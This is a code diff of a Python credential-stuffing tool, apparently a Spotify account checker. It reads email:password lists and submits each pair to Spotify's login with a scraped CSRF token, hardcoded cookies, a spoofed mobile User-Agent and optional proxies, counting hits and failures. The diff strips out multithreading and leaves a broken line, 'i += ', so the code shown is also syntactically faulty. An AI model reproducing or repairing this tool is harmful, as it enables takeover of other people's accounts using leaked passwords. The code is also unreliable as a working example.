@@ -2,7 +2,6 @@ import requests
 import os
 import webbrowser
 import time
-import concurrent.futures
 from random import choice
 
 
@@ -38,7 +37,6 @@ def checker(data,folder_name,i,x,proxy_filename,use_proxies):
     password = data[1]
     csrf_token = get_tockens()
     api = requests.Session()
-   # cooki =   {"sp_t":"b2a7bff29032940babb0340d9c57658d", "csrf_token" : csrf_token, "sp_ab":"%7B%222019_04_premium_menu%22%3A%22control%22%7D", "_ga":"GA1.2.297041723.1568590622","sp_adid":"9e1fc0b6-d939-453a-be7c-ea9f74fe7574", "sp_last_utm":"%7B%22utm_source%22%3A%22kw-en_brand_contextual_text%22%2C%22utm_medium%22%3A%22paidsearch%22%2C%22utm_campaign%22%3A%22alwayson_mena_kw_premiumbusiness_core_brand%20contextual-desktop%20text%20exact%20kw-en%20google%22%7D", "_gcl_au":"1.1.959631313.1568655406","_scid":"45544064-ae85-4b47-bb48-f080a681705f", "_hjid":"786bf7bc-d028-48d6-ba2e-b4f8f29623ab", "_fbp":"fb.1.1568655409967.1449048628","_sctr":"1|1569272400000","sp_usid":"2cc1b83f-f7f1-4c8a-8120-2ee81f15e814", "spot":"%7B%22t%22%3A1569650829%2C%22m%22%3A%22kw-en%22%2C%22p%22%3A%22premium%22%7D", "_gid":"GA1.2.1861827401.1569650832", "_gat_UA-5784146-31":"1", "_gcl_aw":"GCL.1569650834.EAIaIQobChMIrPff_uzy5AIVVud3Ch14VAdKEAAYASAAEgLaQ_D_BwE","_gcl_dc":"GCL.1569650834.EAIaIQobChMIrPff_uzy5AIVVud3Ch14VAdKEAAYASAAEgLaQ_D_BwE", "_gac_UA-5784146-31":"1.1569650876.EAIaIQobChMIrPff_uzy5AIVVud3Ch14VAdKEAAYASAAEgLaQ_D_BwE", "__bon":"MHwwfDIwNjM3NzI4MTV8ODY2Nzg0NTgyMzB8MXwxfDF8MQ==", "fb_continue":"https%3A%2F%2Fwww.spotify.com%2Fkw-en%2Faccount%2Foverview%2F"}
     cookies = {"fb_continue" : "https%3A%2F%2Fwww.spotify.com%2Fid%2Faccount%2Foverview%2F", "sp_landing" : "play.spotify.com%2F", "sp_landingref" : "https%3A%2F%2Fwww.google.com%2F", "user_eligible" : "0", "spot" : "%7B%22t%22%3A1498061345%2C%22m%22%3A%22id%22%2C%22p%22%3Anull%7D", "sp_t" : "ac1439ee6195be76711e73dc0f79f89", "sp_new" : "1", "csrf_token" : csrf_token, "__bon" : "MHwwfC0zMjQyMjQ0ODl8LTEzNjE3NDI4NTM4fDF8MXwxfDE=", "remember" : "false@false.com", "_ga" : "GA1.2.153026989.1498061376", "_gid" : "GA1.2.740264023.1498061376"}
     headers = {"User-Agent" : "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/1.0 Mobile/12F69 Safari/600.1.4", "Accept" : "application/json, text/plain", "Content-Type": "application/x-www-form-urlencoded"}
     payload = {"remember" : "false", "username" : email, "password" : password, "csrf_token" : csrf_token}
@@ -141,12 +139,7 @@ hits = 0
 bad = 0
 x = len(arrange)
 for lines in arrange:
-    i += 1
-
-    with concurrent.futures.ThreadPoolExecutor() as executor:
-        executor.map(checker,data[0],data[1])
-
-
+    i += 
 
     data = lines.split(":")
     checker(data,folder_name,i,x,proxy_file, use_proxies)
